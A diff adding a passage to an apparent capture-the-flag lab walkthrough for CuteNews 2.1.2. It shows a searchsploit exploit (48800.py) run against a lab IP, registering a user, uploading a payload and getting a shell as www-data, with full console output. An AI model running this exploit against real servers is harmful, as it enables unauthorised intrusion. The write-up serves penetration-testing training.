@@ -291,3 +291,51 @@ Cute News 2.1.2 (news management system)
 > searchsploit cutenews 2.1.2
 ```
 ![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/35532951-adc7-4fa6-b051-6d157b8960ed)
+
+Modify the exploit since "Cute News" is installed in the root dorectory.
+
+```
+> python3 48800.py
+
+
+
+           _____     __      _  __                     ___   ___  ___
+          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
+         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
+         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
+                                ___  _________
+                               / _ \/ ___/ __/
+                              / , _/ /__/ _/
+                             /_/|_|\___/___/
+
+
+
+
+[->] Usage python3 expoit.py
+
+Enter the URL> http://192.168.222.128
+================================================================
+Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
+================================================================
+[-] No hashes were found skipping!!!
+================================================================
+
+=============================
+Registering a users
+=============================
+[+] Registration successful with username: LBEZG5YYUM and password: LBEZG5YYUM
+
+=======================================================
+Sending Payload
+=======================================================
+signature_key: e4d899689070c7c71984787291674266-LBEZG5YYUM
+signature_dsi: 7114303731d4cd8904c1c34b4d0c1567
+logged in user: LBEZG5YYUM
+============================
+Dropping to a SHELL
+============================
+
+command > whoami && id
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
